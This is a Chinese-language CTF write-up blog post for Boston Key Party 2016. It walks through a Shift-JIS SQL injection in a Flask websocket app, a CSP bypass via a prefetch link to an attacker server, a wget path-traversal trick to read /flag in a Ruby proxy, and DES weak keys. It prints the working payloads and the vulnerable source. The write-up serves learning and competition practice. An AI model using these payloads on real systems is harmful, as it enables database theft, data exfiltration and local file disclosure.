title: bkp2016_writeup
date: 2016-03-07 13:23:51
tags:
- ctf
- Blogs
categories:
- Blogs
---
周末打了个波士顿的bostonpartyctf，虽然排名不高，但是web学到了挺多有意思的东西...
```
1 - HITCON - 96
2 - b1o0p - 96
3 - PPP - 87
4 - Eat Sleep Pwn Repeat - 82
5 - LC↯BC - 78
6 - PartOfShellphish - 75
7 - RoKyc - 71
8 - Dragon Sector - 68
9 - !SpamAndHex - 67
10 - KAIST GoN - 67
85 - HDUISA - 17
```
<!--more-->
# WEB

## web 1 (sjis编码)
刚刚打开是一个什么特别谜的东西，按回车也没弄明白怎么回事，后来给了源码，才发现是自己的浏览器有毒...

ganbatte.py
```
#!/usr/bin/env python

from flask import Flask, render_template, Response
from flask_sockets import Sockets
import json
import MySQLdb

app = Flask(__name__)
sockets = Sockets(app)

with open("config.json") as f:
 connect_params = json.load(f)

connect_params["db"] = "ganbatte"

# Use Shift-JIS for everything so it uses less bytes
Response.charset = "shift-jis"
connect_params["charset"] = "sjis"

questions = [
  "name",
  "quest",
  "favorite color",
]

# List from http://php.net/manual/en/function.mysql-real-escape-string.php
MYSQL_SPECIAL_CHARS = [
  ("\\", "\\\\"),
  ("\0", "\\0"),
  ("\n", "\\n"),
  ("\r", "\\r"),
  ("'", "\\'"),
  ('"', '\\"'),
  ("\x1a", "\\Z"),
]
def mysql_escape(s):
  for find, replace in  MYSQL_SPECIAL_CHARS:
    s = s.replace(find, replace)
  return s

@sockets.route('/ws')
def process_questsions(ws):
  i = 0
  conn = MySQLdb.connect(**connect_params)
  with conn as cursor:
    ws.send(json.dumps({"type": "question", "topic": questions[i], "last": i == len(questions)-1}))
    while not ws.closed:
      message = ws.receive()
      if not message: continue
      message = json.loads(message)
      if message["type"] == "answer":
        question = mysql_escape(questions[i])
        answer = mysql_escape(message["answer"])
        cursor.execute('INSERT INTO answers (question, answer) VALUES ("%s", "%s")' % (question, answer))
        conn.commit()
        i += 1
        if i < len(questions):
          ws.send(json.dumps({"type": "question", "topic": questions[i], "last": i == len(questions)-1}))
      elif message["type"] == "get_answer":
        question = mysql_escape(message["question"])
        answer = mysql_escape(message["answer"])
        cursor.execute('SELECT * FROM answers WHERE question="%s" AND answer="%s"' % (question, answer))
        ws.send(json.dumps({"type": "got_answer", "row": cursor.fetchone()}))x
      print message

@app.route('/')
def hello():
  return app.send_static_file("index.html")

if __name__ == "__main__":
  from gevent import pywsgi
  from geventwebsocket.handler import WebSocketHandler
  addr = ('localhost', 5000)

  server = pywsgi.WSGIServer(addr, app, handler_class=WebSocketHandler)
  server.serve_forever()
```

还有个js，是socket的初始化.
整个站是flask+web_socket的站。

仔细读读源码大概就是type=answer是插入数据。type=get_answer是select数据，发现编码是一个传说中的日文编码sjis，本来以为是宽字节，结果搜到socket不能urlencode，所以传入的%bf%5c这样的就是当作6个字符，而不是uncode为符号，所以卡了很久，后来从一个小伙伴那里知道，在sjis中有个符号（js中`String.fromCharCode(0xa5)`）可以代替\，所以payload是这样的。

`SENT: {"type":"get_answer","question":"name¥","answer":"||1#"}`
这里的这个¥可以代替\，这样就可以转义后面的双引号，然后就会返回第一条数据。
`RESPONSE: {"type": "got_answer", "row": [1, "flag", "BKPCTF{TryYourBestOnTheOthersToo}"]}`

关于符号的问题是从这里看到的。
[http://www.tryphp.net/phpsecurity-sql/](http://www.tryphp.net/phpsecurity-sql/)

注意站是日文，而且是utf-8编码，加载成功后符号就会变成\.....

后来看别人的writeup，找到一篇文章.
[http://www.we-edit.de/stackoverflow/question/how-to-create-a-sql-injection-attack-with-shift-jis-and-cp932-28705324.html](http://www.we-edit.de/stackoverflow/question/how-to-create-a-sql-injection-attack-with-shift-jis-and-cp932-28705324.html)


## web2 bug bounty(xss bypass csp)

一个类似于bug提交平台，提交bug，输对验证码就会提交成功，然后就有人审核。
感觉有点儿像xss，但是开了CSP;

```
Content-Security-Policy
default-src 'none'; connect-src 'self'; frame-src 'self'; script-src 52.87.183.104:5000/dist/js/ 'sha256-KcMxZjpVxhUhzZiwuZ82bc0vAhYbUJsxyCXODP5ulto=' 'sha256-u++5+hMvnsKeoBWohJxxO3U9yHQHZU+2damUA6wnikQ=' 'sha256-zArnh0kTjtEOVDnamfOrI8qSpoiZbXttc6LzqNno8MM=' 'sha256-3PB3EBmojhuJg8mStgxkyy3OEJYJ73ruOF7nRScYnxk=' 'sha256-bk9UfcsBy+DUFULLU6uX/sJa0q7O7B8Aal2VVl43aDs='; font-src 52.87.183.104:5000/dist/fonts/ fonts.gstatic.com; style-src 52.87.183.104:5000/dist/css/ fonts.googleapis.com; img-src 'self';
```
看了看感觉没什么问题，然后就去找关于bypass csp的文章了，后来找到一个掉炸天的ppt，有时间专门写一个博客研究下。

这题知道是bypass csp，但是没什么想法，后来看到writeup才发现是一个知道的东西，果然黑盒和白盒测试不太一样...

payload：
```
<link rel="prefetch" href="http://your-server/">  
```
提交并输对验证码就会有人打开审核的。

## web3 OptiProxy (ruby web+wget 参数)
最开始看到源码简直懵了...这个ctf举办方好有感觉，不是python就是ruby，吊！

```
require 'nokogiri'
require 'open-uri'
require 'sinatra'
require 'shellwords'
require 'base64'
require 'fileutils'

set :bind, "0.0.0.0"
set :port, 5300
cdir = Dir.pwd                          //dir.pwd返回当前路劲
get '/' do
        str = "welcome to the automatic resource inliner, we inline all images"
        str << " go to /example.com to get an inlined version of example.com"
        str << " flag is in /flag"
        str << " source is in /source"
        str
end

get '/source' do
        IO.read "/home/optiproxy/optiproxy.rb"
end

get '/flag' do
        str = "I mean, /flag on the file system... If you're looking here, I question"
        str << " your skills"
        str
end

get '/:url' do
        url = params[:url]
        main_dir = Dir.pwd            //返回当前路径
        temp_dir = ""
        dir = Dir.mktmpdir "inliner"     //在tmp下创建一个inliner+随机数的文件夹
        Dir.chdir dir                   //改变当前目录
        temp_dir = dir                  //复制给temp_dir 
        exec = "timeout 5 wget -T 2 --page-requisites #{Shellwords.shellescape url}"            //shellwords.shellescape对url进行转义
        `#{exec}`                         //执行命令行wget
        my_dir = Dir.glob ("**/")              //匹配所有文件夹，以数组的方式返回
        Dir.chdir my_dir[0]                    //改变当前目录为第一个（也就是wget回来的）
        index_file = "index.html"
        html_file = IO.read index_file             //返回index.html的源码
        doc = Nokogiri::HTML(open(index_file))
        doc.xpath('//img').each do |img|                                   //遍历index.html的所有img标签                   
                header = img.xpath('preceding::h2[1]').text
                image = img['src']
                img_data = ""
                uri_scheme = URI(image).scheme
                begin                                    // try
                        if (uri_scheme == "http" or uri_scheme == "https")        //拼接url
                                url = image
                        else
                                url = "http://#{url}/#{image}"
                        end
                        img_data = open(url).read
                        b64d = "data:image/png;base64," + Base64.strict_encode64(img_data)
                        img['src'] = b64d
                rescue                               //相当于catch
                        # gotta catch 'em all
                        puts "lole"
                        next
                end
        end
        puts dir
        FileUtils.rm_rf dir    //删掉所有内容。
        Dir.chdir main_dir
        doc.to_html
end
```
先学了一下午的ruby web基本看懂了，站基本是一个代理一样的东西。就像
`http://optiproxy.bostonkey.party:5300/example.com`
他会wget example.com的首页index.html和img，然后返回，并把Img src的内容以base64的方式返回回来。

在服务器上写一个img标签，`<img src="http://www.baidu.com" />`
因为是wget，所以还是外网，不知道怎么读本地的东西，卡了很久，后来别人告诉我，我才知道是wget的--page-requisites参数，如果你的img像这样写
`<img src="http:/../../../../flag" />`
那么就能过他的http头判定，然后服务器wget会建立一个http:的文件夹，接着就能读到/flag了，吊吊吊...


# PPC & Crypto
## des ofb (des 弱口令密钥)

题目不是我做的，但是还是很有收获。
没思路，一脸懵逼
[https://eprint.iacr.org/2007/385.pdf](https://eprint.iacr.org/2007/385.pdf)
DES弱密钥，有四个：
weak_pass = [
	'\x01'*8,
	'\xfe'*8,
	'\xe0'*4 + '\xf1'*4,
	'\x1f'*4 + '\x0e'*4
]
写脚本解密一下就出来了。

具体有[朋友的博客](https://lightless.me/archives/DES-Weak-Keys.html)